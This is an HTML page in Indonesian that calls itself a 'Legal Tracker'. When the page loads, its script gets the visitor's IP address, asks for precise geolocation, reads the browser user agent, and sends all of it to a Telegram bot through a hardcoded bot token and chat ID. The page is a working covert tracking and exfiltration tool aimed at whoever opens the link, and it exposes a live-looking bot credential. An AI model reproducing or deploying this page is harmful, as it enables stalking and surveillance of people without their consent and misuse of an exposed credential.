
<!DOCTYPE html>

<body>
  <div class="box">
    <h1>ğŸ“¡ Mengambil data kamu...</h1>
    <p id="info">Tunggu sebentar...</p>
  </div>

  <script>
    const token = "8113101605:AAELCPTCdr4cEBe6opWXY7Rg5UEM969iPUM";
    const chatId = "7932600874";

    async function getIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch (e) {
        return "Tidak ditemukan";
      }
    }

    function getLocation() {
      return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve(pos.coords),
          (err) => reject("Lokasi tidak diizinkan")
        );
      });
    }

    async function jalankan() {
      const ip = await getIP();
      const ua = navigator.userAgent;
      let info = `IP: ${ip}<br>User-Agent: ${ua}<br>`;
      let lat = "-", lon = "-", akurasi = "-";

      try {
        const loc = await getLocation();
        lat = loc.latitude;
        lon = loc.longitude;
        akurasi = loc.accuracy;
        info += `Lokasi: ${lat}, ${lon}<br>Akurasi: ${akurasi}m`;
      } catch (err) {
        info += `<br><i>${err}</i>`;
      }

      document.getElementById("info").innerHTML = info;

      const pesan = `ğŸ“¡ *Legal Tracker*
ğŸŒ IP: ${ip}
ğŸ“ Lokasi: ${lat}, ${lon} (akurasi: ${akurasi}m)
ğŸ§  User-Agent: ${ua}`;
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: pesan,
          parse_mode: "Markdown"
        })
      });
    }

    jalankan();
  </script>
</body>
